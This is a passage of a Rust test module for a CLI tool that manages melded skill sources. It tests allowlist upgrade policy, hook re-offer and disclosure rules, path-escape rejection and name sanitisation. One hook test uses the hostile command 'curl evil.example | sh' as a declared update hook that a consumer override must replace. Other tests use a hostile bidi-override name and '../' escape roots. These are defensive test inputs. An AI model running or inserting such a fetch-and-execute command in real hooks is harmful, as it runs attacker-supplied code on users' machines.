                    &registry
                ),
                UpgradeDisposition::Consider,
                "{name}: an instance of an allowed repo stays allowed"
            );
        }

        // An item whose source is not registered has no structural base
        // identity to recover, so it is refused rather than guessed at. It is
        // reported as SourceNotRegistered (POL-69), not PolicyBlocked: the
        // source simply is not melded any more, which is a different fact
        // than "outside the allowlist".
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/me/allowed-src#skills/foo"),
                None,
                None,
                None,
                Some(&policy),
                &Registry::default()
            ),
            UpgradeDisposition::SourceNotRegistered,
            "an unregistered instance name fails closed, distinctly from a policy block"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: POL-69
    // A recorded source name that resolves to NO registered source (e.g. the
    // source was unmelded after the item was installed) must be reported
    // distinctly from PolicyBlocked: the fail-closed refusal still applies
    // (POL-68), but the reason is that the source is not registered, not that
    // a registered source's identity fell outside the allowlist.
    #[test]
    fn upgrade_disposition_distinguishes_unregistered_source_from_policy_block() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Policy::load().unwrap().expect("policy should load");

        // A registered, but disallowed, source: PolicyBlocked.
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/them/blocked-src"),
                None,
                None,
                None,
                Some(&policy),
                &registry,
            ),
            UpgradeDisposition::PolicyBlocked,
            "a registered source outside the allowlist is PolicyBlocked"
        );

        // A source name with NO registered source at all (unmelded, or never
        // melded under that name): SourceNotRegistered, not PolicyBlocked,
        // even though both still refuse the upgrade.
        assert_eq!(
            upgrade_item_disposition(
                &item("foo", "github.com/gone/unmelded-src"),
                None,
                None,
                None,
                Some(&policy),
                &registry,
            ),
            UpgradeDisposition::SourceNotRegistered,
            "an item whose source is not registered must not be reported as PolicyBlocked"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: POL-12
    // When the scoped item itself comes from a disallowed source, it passes the
    // filter and is then correctly reported as PolicyBlocked (the skip is for an
    // item the user actually selected, which is the intended behavior).
    #[test]
    fn pol12_scoped_upgrade_skips_selected_disallowed_item() {
        let policy_toml = concat!(
            "[sources]\n",
            "lock = true\n",
            "allow = [\"github.com/me/allowed-src\"]\n",
        );
        let (_guard, base) = with_policy(policy_toml);
        let policy = Policy::load().unwrap().expect("policy should load");

        let selected = item("blocked-item", "github.com/them/blocked-src");
        let filter = parse_item_ref("blocked-item").unwrap();
        let registry = registry_of(&["me/allowed-src", "them/blocked-src"]);

        assert_eq!(
            upgrade_item_disposition(
                &selected,
                Some(&filter),
                None,
                None,
                Some(&policy),
                &registry
            ),
            UpgradeDisposition::PolicyBlocked,
            "a selected item from a disallowed source is still reported"
        );

        let _ = std::fs::remove_dir_all(&base);
    }

    // spec: TUI-72 TUI-73
    #[test]
    fn upgrade_no_sync_keys_skips_inapplicable_confirmed_keys_without_aborting() {
        // The TUI's confirm-to-apply window is real: by the time
        // `upgrade_no_sync_keys` runs, a confirmed key may no longer be
        // applicable -- its drift already resolved, or the item never existed
        // at all (forgotten, or a stale reference). Neither case may abort the
        // batch; each confirmed key is considered independently and an
        // inapplicable one is silently dropped, exactly like an out-of-scope
        // item already is for a glob-filtered `upgrade <item>`.
        use std::process::Command;

        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!(
            "mind-cmd-upgrade-keys-skip-{}-{n}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        let paths = Paths {
            mind_home: base.join("mind"),
            claude_home: base.join("claude"),
        };
        crate::paths::mkdir_p(&paths.mind_home).unwrap();
        crate::config::Config {
            lobes: vec![crate::config::LobeEntry::bare(
                paths.claude_home.to_str().unwrap(),
            )],
            ..Default::default()
        }
        .save(&paths)
        .unwrap();

        let src = base.join("skip-source");
        std::fs::create_dir_all(src.join("skills/applies")).unwrap();
        std::fs::write(
            src.join("skills/applies/SKILL.md"),
            "---\ndescription: applies skill\n---\n# applies\noriginal\n",
        )
        .unwrap();
        std::fs::create_dir_all(src.join("skills/resolved")).unwrap();
        let resolved_original = "---\ndescription: resolved skill\n---\n# resolved\noriginal\n";
        std::fs::write(src.join("skills/resolved/SKILL.md"), resolved_original).unwrap();
        let run = |args: &[&str]| {
            Command::new("git")
                .args(args)
                .current_dir(&src)
                .output()
                .expect("git");
        };
        run(&["-c", "init.defaultBranch=main", "init", "-q"]);
        run(&["config", "user.email", "t@t"]);
        run(&["config", "user.name", "t"]);
        run(&["add", "-A"]);
        run(&["commit", "-qm", "initial"]);

        meld(
            &paths,
            src.to_str().unwrap(),
            None,
            vec![],
            vec![],
            false,
            PinRequest::None,
            None,
            false,
            None,
        )
        .expect("meld");
        for item_key in ["skill:applies", "skill:resolved"] {
            learn(
                &paths,
                item_key,
                false,
                InstallFlow {
                    yes: true,
                    clobber: Clobber::Force,
                    dangerously_skip: true,
                    dangerously_skip_build: true,
                },
            )
            .expect("learn");
        }

        let manifest_before = crate::manifest::Manifest::load(&paths).unwrap();
        let applies_hash_before = manifest_before
            .items
            .get("skill:applies")
            .unwrap()
            .hash
            .clone();
        let resolved_hash_before = manifest_before
            .items
            .get("skill:resolved")
            .unwrap()
            .hash
            .clone();

        // `skill:applies` drifts for real and stays drifted -- this is the
        // confirmed key that must actually apply.
        std::fs::write(
            src.join("skills/applies/SKILL.md"),
            "---\ndescription: applies skill\n---\n# applies\nedited\n",
        )
        .unwrap();
        // spec: TUI-72 TUI-73 -- L12: `skill:resolved` also drifts for real and
        // STAYS drifted (unlike the old version of this test, which reverted it
        // back to `resolved_original` before the apply ran -- with the content
        // unchanged, `resolved_hash_after == resolved_hash_before` could never
        // fail regardless of whether `key_scope` worked, since the item was
        // never in `pending` at all to begin with). `skill:resolved` is
        // deliberately left OUT of `confirmed_keys` below, so this is now a
        // real exercise of `key_scope`: an item that genuinely IS pending but
        // was never confirmed must come out of the apply untouched.
        std::fs::write(
            src.join("skills/resolved/SKILL.md"),
            "---\ndescription: resolved skill\n---\n# resolved\nedited\n",
        )
        .unwrap();

        // The confirmed set also names a key that was never installed at all
        // (e.g. forgotten between confirm and apply, or a stale reference).
        // `skill:resolved` is NOT in this set, even though it is genuinely
        // out of date (see above).
        let confirmed_keys = vec!["skill:applies".to_string(), "skill:ghost".to_string()];

        let result = upgrade_no_sync_keys(&paths, true, &confirmed_keys, false, false);
        assert!(
            result.is_ok(),
            "a partially-inapplicable confirmed set must not abort the run: {:?}",
            result.err()
        );

        let manifest_after = crate::manifest::Manifest::load(&paths).unwrap();
        let applies_hash_after = manifest_after
            .items
            .get("skill:applies")
            .unwrap()
            .hash
            .clone();
        let resolved_hash_after = manifest_after
            .items
            .get("skill:resolved")
            .unwrap()
            .hash
            .clone();

        assert_ne!(
            applies_hash_after, applies_hash_before,
            "the still-applicable confirmed key must still be upgraded"
        );
        assert_eq!(
            resolved_hash_after, resolved_hash_before,
            "a genuinely pending item that was never in the confirmed key set \
             must be left untouched by `key_scope` -- unlike `skill:applies`, \
             its content really did drift, so this only holds if `key_scope` \
             actually excluded it"
        );
        // No panic and no error for `skill:ghost`, which was never installed:
        // reaching this point at all is the assertion.

        let _ = std::fs::remove_dir_all(&base);
    }

    /// A declared install hook, for the selector tests.
    fn declared_install(run: &str) -> crate::mindfile::ResolvedHook {
        crate::mindfile::ResolvedHook {
            run: run.to_string(),
            name: None,
            optional: false,
            event: HookEvent::Install,
        }
    }

    /// Whether `upgrade` would offer any hook for this source, when the source
    /// still declares every recorded command as an install hook and declares no
    /// update hook (the install-hook path, HOOK-122). The `pending_update_hooks`
    /// selector replaced the old `hook_rerun_warranted` predicate; this keeps
    /// the truth table it covered.
    fn hook_rerun_warranted(source: &crate::source::Source) -> bool {
        let declared: Vec<crate::mindfile::ResolvedHook> = source
            .install_hooks
            .iter()
            .map(|r| declared_install(&r.command))
            .collect();
        !select_upgrade_hooks(source, &declared, true)
            .hooks
            .is_empty()
    }

    /// Build a bare `Source` for the `hook_rerun_warranted` truth table. Uses
    /// `parse_spec` so the identity fields are filled the same way `meld` fills
    /// them; the test only manipulates the commit and install_hooks fields.
    ///
    /// `hooks` is a list of `(command, ran_at)` pairs to populate
    /// `Source.install_hooks`.
    fn hook_source(commit: Option<&str>, hooks: &[(&str, Option<&str>)]) -> crate::source::Source {
        use crate::source::RecordedSourceHook;
        let mut s = crate::source::parse_spec("acme/tools").expect("spec parses");
        s.commit = commit.map(str::to_string);
        s.install_hooks = hooks
            .iter()
            .map(|(cmd, ran_at)| RecordedSourceHook::install(*cmd, ran_at.map(str::to_string)))
            .collect();
        s
    }

    /// A recorded install hook the source's clone no longer declares must not be
    /// re-offered: the disclosure would say `Event: install` for a command no
    /// site declares, and a `--dangerously-skip-install-hook-check` run would
    /// execute it unattended at a commit the author controls.
    // spec: HOOK-55
    #[test]
    fn a_withdrawn_install_hook_is_not_replayed_from_the_record() {
        let source = hook_source(Some("new0000"), &[("make install", Some("old0000"))]);
        assert!(
            select_upgrade_hooks(&source, &[], true).hooks.is_empty(),
            "a record with no matching declaration is not offered"
        );
        assert!(
            !select_upgrade_hooks(&source, &[declared_install("make install")], true)
                .hooks
                .is_empty(),
            "the same record IS offered while the source still declares it"
        );
    }

    /// The install-hook fallback takes the author's `name` and `optional` flag
    /// from the declaration, not from the record (which carries neither for a
    /// declared hook). Disclosing an optional hook as required, under its raw
    /// command instead of its name, misstates the two things the consent prompt
    /// is for.
    // spec: HOOK-51 HOOK-52
    #[test]
    fn a_pending_install_hook_is_disclosed_with_its_declared_name_and_optional_flag() {
        let source = hook_source(Some("new0000"), &[("make setup", Some("old0000"))]);
        let declared = vec![crate::mindfile::ResolvedHook {
            run: "make setup".to_string(),
            name: Some("Build the tooling".to_string()),
            optional: true,
            event: HookEvent::Install,
        }];
        let pending = select_upgrade_hooks(&source, &declared, true);
        assert_eq!(pending.event, "install");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(pending.hooks[0].label, "Build the tooling");
        assert!(
            pending.hooks[0].optional,
            "an optional hook must not be disclosed as required"
        );
    }

    /// A consumer `meld --install-hook` override covers the update event too: a
    /// source that moves its command to `event = "update"` must not slip the
    /// author's command past a consumer who replaced it (HOOK-56).
    // spec: HOOK-56 HOOK-122
    #[test]
    fn a_recorded_override_replaces_the_sources_update_hooks() {
        let mut source = hook_source(Some("new0000"), &[]);
        let mut overridden = crate::source::RecordedSourceHook::install("./mine.sh", None);
        overridden.origin = Some(HookOrigin::Override);
        source.install_hooks.push(overridden);
        let declared = vec![crate::mindfile::ResolvedHook {
            run: "curl evil.example | sh".to_string(),
            name: None,
            optional: false,
            event: HookEvent::Update,
        }];

        let pending = select_upgrade_hooks(&source, &declared, true);
        assert_eq!(pending.event, "update");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(
            pending.hooks[0].run, "./mine.sh",
            "the consumer's command is what runs"
        );
        assert_eq!(
            pending.hooks[0].declared_override.as_deref(),
            Some("curl evil.example | sh"),
            "the disclosure still names the declared command it replaced"
        );
    }

    /// A curated `[[discover.sources.hooks]]` update entry (DSC-61) lives in the
    /// PARENT's manifest, so it is offered from the record. It stops applying
    /// once the nested source ships a `mind.toml` of its own (DSC-60).
    // spec: HOOK-127
    #[test]
    fn a_curated_update_hook_is_offered_from_the_record_and_gated_by_dsc_60() {
        let mut source = hook_source(Some("new0000"), &[]);
        let mut curated = crate::source::RecordedSourceHook::install("./migrate.sh", None);
        curated.event = Some(RecordedEvent::Update);
        curated.origin = Some(HookOrigin::Curated);
        curated.name = Some("Migrate".to_string());
        curated.optional = true;
        source.install_hooks.push(curated);

        let pending = select_upgrade_hooks(&source, &[], false);
        assert_eq!(pending.event, "update");
        assert_eq!(pending.hooks.len(), 1);
        assert_eq!(pending.hooks[0].run, "./migrate.sh");
        assert_eq!(pending.hooks[0].label, "Migrate");
        assert!(pending.hooks[0].optional);

        let gated = select_upgrade_hooks(&source, &[], true);
        assert_eq!(
            gated.event, "install",
            "a nested source with its own mind.toml drops the curated hooks"
        );
        assert!(gated.hooks.is_empty());
    }

    // spec: HOOK-11 HOOK-55
    #[test]
    fn hook_rerun_warranted_truth_table() {
        // No hooks recorded: never re-run.
        assert!(
            !hook_rerun_warranted(&hook_source(Some("abc1234"), &[])),
            "no install_hooks means no re-run"
        );

        // Hook already ran at the current commit: nothing to do.
        assert!(
            !hook_rerun_warranted(&hook_source(
                Some("abc1234"),
                &[("make install", Some("abc1234"))],
            )),
            "ran_at == commit means the hook already ran here"
        );

        // All hooks ran at current commit: nothing to do.
        assert!(
            !hook_rerun_warranted(&hook_source(
                Some("abc1234"),
                &[
                    ("make build", Some("abc1234")),
                    ("make install", Some("abc1234")),
                ],
            )),
            "all hooks ran at current commit means no re-run warranted"
        );

        // Hook recorded but never run (skipped meld): re-offer it.
        assert!(
            hook_rerun_warranted(&hook_source(Some("abc1234"), &[("make install", None)],)),
            "a recorded-but-never-run hook is re-offered"
        );

        // Commit advanced past the commit the hook last ran at: re-offer it.
        assert!(
            hook_rerun_warranted(&hook_source(
                Some("def5678"),
                &[("make install", Some("abc1234"))],
            )),
            "an advanced commit warrants a re-run"
        );

        // Mixed: one hook ran at current commit, one at a stale commit.
        assert!(
            hook_rerun_warranted(&hook_source(
                Some("new0000"),
                &[
                    ("make build", Some("new0000")),
                    ("make install", Some("old0000")),
                ],
            )),
            "at least one stale hook warrants a re-run"
        );
    }

    // spec: HOOK-57 HOOK-123
    // The init-source scaffold must include commented [[hooks]] examples for the
    // install, update, and uninstall events, at least one marked optional = true,
    // and must state the install hook's idempotence expectation.
    #[test]
    fn init_source_scaffold_includes_hooks_examples() {
        // Create a temp directory to run init_source in.
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let tmp =
            std::env::temp_dir().join(format!("mind-cmd-init-hooks-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&tmp).unwrap();
        struct Rm(std::path::PathBuf);
        impl Drop for Rm {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
        let _rm = Rm(tmp.clone());

        // init_source should create the scaffold.
        init_source(Some(tmp.to_str().unwrap()), false, false, false, None)
            .expect("init_source should succeed");

        let toml_path = tmp.join("mind.toml");
        assert!(toml_path.exists(), "mind.toml must be created");
        let contents = std::fs::read_to_string(&toml_path).unwrap();

        // HOOK-57: must include [[hooks]] commented examples.
        assert!(
            contents.contains("[[hooks]]"),
            "scaffold must include a commented [[hooks]] example: {contents}"
        );
        // Must show an install event.
        assert!(
            contents.contains("install"),
            "scaffold must show event = \"install\": {contents}"
        );
        // Must show an uninstall event.
        assert!(
            contents.contains("uninstall"),
            "scaffold must show event = \"uninstall\": {contents}"
        );
        // At least one example marked optional = true.
        assert!(
            contents.contains("optional = true"),
            "scaffold must have at least one optional = true example: {contents}"
        );
        // spec: HOOK-123 -- the scaffold states the idempotence expectation an
        // install hook's re-run at upgrade creates, and shows the update event
        // as the escape for a step that cannot be made idempotent.
        assert!(
            contents.contains("idempotent"),
            "scaffold must state that an install hook is expected to be \
             idempotent: {contents}"
        );
        assert!(
            contents.contains("event = \"update\""),
            "scaffold must show an update-event example: {contents}"
        );
        // All [[hooks]] content is commented out (lines starting with # after trimming).
        // Check that the literal text "[[hooks]]" is preceded by a #.
        let has_uncommented_hooks = contents.lines().any(|l| l.trim() == "[[hooks]]");
        assert!(
            !has_uncommented_hooks,
            "[[hooks]] examples must all be commented out: {contents}"
        );

        // Existing assertions still pass (regression guard).
        assert!(
            contents.contains("[source]"),
            "scaffold must still have [source]"
        );
        assert!(
            contents.contains("# namespace = \"prefix\""),
            "scaffold must still have commented namespace: {contents}"
        );
    }

    // spec: HOOK-58
    // The recall --sources hook token is count-aware: no token for 0 hooks,
    // ` hook` for 1, ` hooks(N)` for N > 1.
    #[test]
    fn hook_token_is_count_aware() {
        // 0 hooks -> empty string.
        let s0 = hook_source(Some("abc"), &[]);
        let token0 = match s0.install_hooks.len() {
            0 => String::new(),
            1 => " hook".to_string(),
            n => format!(" hooks({n})"),
        };
        assert_eq!(token0, "", "no hooks => empty token");

        // 1 hook -> ` hook`.
        let s1 = hook_source(Some("abc"), &[("make install", Some("abc"))]);
        let token1 = match s1.install_hooks.len() {
            0 => String::new(),
            1 => " hook".to_string(),
            n => format!(" hooks({n})"),
        };
        assert_eq!(token1, " hook", "1 hook => ' hook'");

        // 2 hooks -> ` hooks(2)`.
        let s2 = hook_source(
            Some("abc"),
            &[("make build", Some("abc")), ("make install", Some("abc"))],
        );
        let token2 = match s2.install_hooks.len() {
            0 => String::new(),
            1 => " hook".to_string(),
            n => format!(" hooks({n})"),
        };
        assert_eq!(token2, " hooks(2)", "2 hooks => ' hooks(2)'");
    }

    // spec: HOOK-50 HOOK-55
    // Verifies that `hook_rerun_warranted` uses the new multi-hook model: a source
    // with multiple install hooks is re-offered when ANY hook is pending, and not
    // re-offered when ALL hooks have ran_at == commit.
    #[test]
    fn hook_rerun_warranted_multi_hook_model() {
        // All hooks ran at the current commit: not warranted.
        let all_current = hook_source(
            Some("fff000"),
            &[
                ("make build", Some("fff000")),
                ("make install", Some("fff000")),
                ("make test", Some("fff000")),
            ],
        );
        assert!(
            !hook_rerun_warranted(&all_current),
            "all hooks current => no re-run warranted"
        );

        // One hook never ran (ran_at == None): warranted.
        let one_never_ran = hook_source(
            Some("fff000"),
            &[
                ("make build", Some("fff000")),
                ("make install", None), // skipped at meld time
            ],
        );
        assert!(
            hook_rerun_warranted(&one_never_ran),
            "one hook with ran_at=None => re-run warranted"
        );

        // Source has no commit yet (None): all pending (ran_at=None matches None but
        // hooks with a ran_at=Some differ from None).
        let no_commit = hook_source(None, &[("make install", Some("old"))]);
        assert!(
            hook_rerun_warranted(&no_commit),
            "commit=None and ran_at=Some => they differ => warranted"
        );
    }

    // ---- absorb helper unit tests ----

    /// convention_path_in_root derives the correct convention path for each kind.
    // spec: ABS-1
    #[test]
    fn convention_path_in_root_derives_correct_paths() {
        let root = std::path::Path::new("/repo");
        assert_eq!(
            convention_path_in_root(root, ItemKind::Skill, "review"),
            PathBuf::from("/repo/skills/review"),
            "skill convention path is skills/<name>/"
        );
        assert_eq!(
            convention_path_in_root(root, ItemKind::Agent, "dev"),
            PathBuf::from("/repo/agents/dev.md"),
            "agent convention path is agents/<name>.md"
        );
        assert_eq!(
            convention_path_in_root(root, ItemKind::Rule, "style"),
            PathBuf::from("/repo/rules/style.md"),
            "rule convention path is rules/<name>.md"
        );
        // spec: CMD-8 -- a command absorbs to the same shape as an agent/rule.
        assert_eq!(
            convention_path_in_root(root, ItemKind::Command, "ship"),
            PathBuf::from("/repo/commands/ship.md"),
            "command convention path is commands/<name>.md"
        );
    }

    /// M7: `absorb_effective_key` sanitizes the on-disk unmanaged-item name
    /// before composing it into the reported `kind:name` key. A hostile name
    /// (a control byte, an ANSI escape, or a bidi override) is NOT
    /// DSC-96-gated at this point -- that gate only runs at catalog-scan time
    /// for a managed source's items, not for an unmanaged lobe entry `absorb`
    /// claims -- so an end-to-end CLI drive of `absorb` on a hostile-named
    /// unmanaged item cannot exercise this: `absorb`'s internal `learn()`
    /// call re-scans the destination source's catalog, and DSC-96 skips the
    /// hostile-named item there before `absorb` ever reaches the success path
    /// this key is built for. This unit test exercises the composition
    /// directly instead, pinning the fix independent of that (unrelated,
    /// upstream) gate.
    // spec: DSC-95
    #[test]
    fn absorb_effective_key_sanitizes_a_hostile_name() {
        let hostile_name = format!("hand{}ma\u{202E}de", '\x07');
        let key = absorb_effective_key(ItemKind::Skill, &hostile_name);
        assert!(
            !key.contains('\x07') && !key.contains('\u{202E}'),
            "the composed key must not carry a raw control byte or bidi override: {key:?}"
        );
        assert_eq!(
            key, "skill:handmade",
            "the sanitized key must still read as the intended name"
        );
    }

    /// expand_tilde expands a leading `~` to the home directory.
    // spec: ABS-2 ABS-3
    #[test]
    fn expand_tilde_handles_home_prefix() {
        let home = dirs::home_dir().expect("home dir");
        // Bare `~` expands to home.
        let expanded = expand_tilde("~");
        assert_eq!(expanded, home, "bare ~ must expand to home directory");
        // `~/foo` expands to home/foo.
        let expanded2 = expand_tilde("~/foo");
        assert_eq!(
            expanded2,
            home.join("foo"),
            "~/foo must expand to <home>/foo"
        );
        // An absolute path passes through unchanged.
        let abs = expand_tilde("/tmp/mydir");
        assert_eq!(
            abs,
            PathBuf::from("/tmp/mydir"),
            "absolute path must be unchanged"
        );
        // A relative path (no tilde) passes through unchanged.
        let rel = expand_tilde("relpath/dir");
        assert_eq!(
            rel,
            PathBuf::from("relpath/dir"),
            "relative path must be unchanged"
        );
    }

    /// first_scan_root returns the destination directory when no mind.toml is present.
    // spec: ABS-1
    #[test]
    fn first_scan_root_defaults_to_dest_dir() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-scanroot-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        // No mind.toml: first_scan_root should return the directory itself.
        let root = first_scan_root(&dir).unwrap();
        assert_eq!(
            root,
            dir.join("."),
            "first_scan_root with no mind.toml must be dest/."
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// first_scan_root uses the first entry in [source].roots when mind.toml declares it.
    // spec: ABS-1
    #[test]
    fn first_scan_root_uses_minds_toml_roots() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-scanroot2-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        // Write a mind.toml with roots = ["packages/agents"]
        std::fs::write(
            dir.join("mind.toml"),
            "[source]\nroots = [\"packages/agents\"]\n",
        )
        .unwrap();
        // The subdirectory must exist for canonicalize-based containment check.
        std::fs::create_dir_all(dir.join("packages/agents")).unwrap();
        let root = first_scan_root(&dir).unwrap();
        assert_eq!(
            root,
            dir.join("packages/agents"),
            "first_scan_root must use first entry of [source].roots"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// first_scan_root rejects a roots entry that escapes the repo via `..`.
    // spec: ABS-10
    #[test]
    fn first_scan_root_rejects_escaping_root() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!(
            "mind-abs-scanroot-escape-{}-{n}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        // Write a mind.toml whose roots entry uses `..` to escape the repo.
        std::fs::write(
            dir.join("mind.toml"),
            "[source]\nroots = [\"../../outside\"]\n",
        )
        .unwrap();
        // The escaped path does exist on the filesystem (the parent dirs do),
        // so canonicalize will work and detect the escape.
        let err = first_scan_root(&dir).unwrap_err();
        assert!(
            matches!(err, crate::error::MindError::InvalidRoot { .. }),
            "an escaping roots entry must be InvalidRoot: {err}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// normalize_path folds `..` and `.` components logically without touching
    /// the filesystem, so it can detect escapes for not-yet-created roots.
    // spec: ABS-10
    #[test]
    fn normalize_path_folds_parent_and_current_components() {
        use std::path::PathBuf;
        // `.` is dropped.
        assert_eq!(
            normalize_path(&PathBuf::from("/repo/./skills")),
            PathBuf::from("/repo/skills"),
            "a `.` component must be dropped"
        );
        // `..` pops the previous component.
        assert_eq!(
            normalize_path(&PathBuf::from("/repo/sub/../skills")),
            PathBuf::from("/repo/skills"),
            "a `..` must pop the previous component"
        );
        // `..` that climbs above the root yields a path that no longer starts
        // with the repo root (so the containment check rejects it).
        let escaped = normalize_path(&PathBuf::from("/repo/../../outside"));
        assert!(
            !escaped.starts_with("/repo"),
            "a climbing `..` chain must escape the repo root: {escaped:?}"
        );
        assert_eq!(
            escaped,
            PathBuf::from("/outside"),
            "folding /repo/../../outside yields /outside"
        );
    }

    /// first_scan_root takes the canonicalize branch (root exists on disk) and
    /// still rejects an escaping root. Distinct from the normalize_path fallback,
    /// this forces the candidate to exist so std::fs::canonicalize succeeds.
    // spec: ABS-10
    #[test]
    fn first_scan_root_rejects_existing_escaping_root_via_canonicalize() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!(
            "mind-abs-scanroot-canon-{}-{n}",
            std::process::id()
        ));
        let dest = base.join("repo");
        let outside = base.join("outside");
        std::fs::create_dir_all(&dest).unwrap();
        // The escape target exists, so canonicalize resolves it to a real path.
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(
            dest.join("mind.toml"),
            "[source]\nroots = [\"../outside\"]\n",
        )
        .unwrap();
        let err = first_scan_root(&dest).unwrap_err();
        assert!(
            matches!(err, crate::error::MindError::InvalidRoot { .. }),
            "an existing escaping root (canonicalize branch) must be InvalidRoot: {err}"
        );
        let _ = std::fs::remove_dir_all(&base);
    }

    /// dest_source_prefix with no melded source and no mind.toml yields None
    /// (unprefixed install).
    // spec: ABS-8
    #[test]
    fn dest_source_prefix_none_when_unset() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-pfx-none-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let registry = crate::source::Registry::default();
        assert_eq!(
            dest_source_prefix(&dir, &registry),
            None,
            "no alias and no mind.toml prefix means no effective prefix"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// dest_source_prefix reads `[source].prefix` from the destination mind.toml
    /// when the source is not yet melded (no alias to consult).
    // spec: ABS-8
    #[test]
    fn dest_source_prefix_reads_mindfile_prefix() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-pfx-toml-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("mind.toml"), "[source]\nprefix = \"tomlpfx\"\n").unwrap();
        let registry = crate::source::Registry::default();
        assert_eq!(
            dest_source_prefix(&dir, &registry),
            Some("tomlpfx".to_string()),
            "an unmelded destination uses its mind.toml [source].prefix"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// When the destination is already melded with a recorded alias (`meld --as`),
    /// the alias wins over the repo's own `[source].prefix` (namespacing.md).
    // spec: ABS-8
    #[test]
    fn dest_source_prefix_alias_beats_mindfile_prefix() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-pfx-alias-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        // The repo declares prefix = "tomlpfx" ...
        std::fs::write(dir.join("mind.toml"), "[source]\nprefix = \"tomlpfx\"\n").unwrap();
        // ... but the melded source records alias = "aliaspfx" (the consumer's --as).
        let mut src = crate::source::parse_spec(&dir.to_string_lossy()).unwrap();
        src.alias = Some("aliaspfx".to_string());
        let registry = crate::source::Registry { sources: vec![src] };
        assert_eq!(
            dest_source_prefix(&dir, &registry),
            Some("aliaspfx".to_string()),
            "the recorded alias must win over the repo's [source].prefix"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// An empty alias on a melded source is ignored and the mind.toml prefix is
    /// used (an empty alias is not a meaningful namespace).
    // spec: ABS-8
    #[test]
    fn dest_source_prefix_empty_alias_falls_through_to_mindfile() {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let dir =
            std::env::temp_dir().join(format!("mind-abs-pfx-empty-{}-{n}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("mind.toml"), "[source]\nprefix = \"tomlpfx\"\n").unwrap();
        let mut src = crate::source::parse_spec(&dir.to_string_lossy()).unwrap();
        src.alias = Some(String::new()); // empty alias
        let registry = crate::source::Registry { sources: vec![src] };
        assert_eq!(
            dest_source_prefix(&dir, &registry),
            Some("tomlpfx".to_string()),
            "an empty alias must not suppress the mind.toml prefix"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ----- NS-30/CLI-161: set_source_namespace mutability lock -----

    /// A throwaway `Paths` under the system temp dir, unique per call.
    fn ns_paths() -> (Paths, PathBuf) {
        let n = COUNTER.fetch_add(1, Ordering::SeqCst);
        let base = std::env::temp_dir().join(format!("mind-ns-set-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let paths = Paths {
            mind_home: base.join("mind"),
            claude_home: base.join("claude"),
        };
        (paths, base)
    }

    /// Build a source named `github.com/acme/<repo>` with the given alias and
    /// persist a registry holding exactly it.
    fn seed_source(paths: &Paths, repo: &str, alias: Option<&str>) -> String {
        let mut src = crate::source::parse_spec(&format!("github:acme/{repo}")).unwrap();
        src.apply_alias(alias.map(|s| s.to_string()));
        let name = src.name.clone();
        let registry = crate::source::Registry { sources: vec![src] };
        registry.save(paths).expect("save registry");
        name
    }

    /// Record an installed item attributed to `source` in the manifest.
    fn seed_installed_item(paths: &Paths, source: &str, kind: ItemKind, name: &str) {
        let mut manifest = Manifest::load(paths).expect("load manifest");
        manifest.insert(InstalledItem {
            kind,
            name: name.to_string(),
            bare_name: name.to_string(),
            source: source.to_string(),
            commit: "deadbeef".to_string(),
            hash: "abc123".to_string(),
            store: format!("store/{name}"),
            links: vec![],
            description: None,
            install_hooks: Vec::new(),
            dropped_requires: Vec::new(),
        });
        manifest.save(paths).expect("save manifest");
    }

    #[test]
    fn set_source_namespace_source_not_found_is_noop() {
        // spec: NS-30 CLI-161 - an unknown source name is a safe no-op (Ok), not
        // an error, and writes nothing.
        let (paths, base) = ns_paths();
        seed_source(&paths, "agents", None);
        let r = set_source_namespace(&paths, "github.com/nope/missing", Some("jk".into()));
        assert!(r.is_ok(), "unknown source must be a no-op Ok: {r:?}");
        // The real source's alias is untouched.
        let reg = Registry::load(&paths).unwrap();
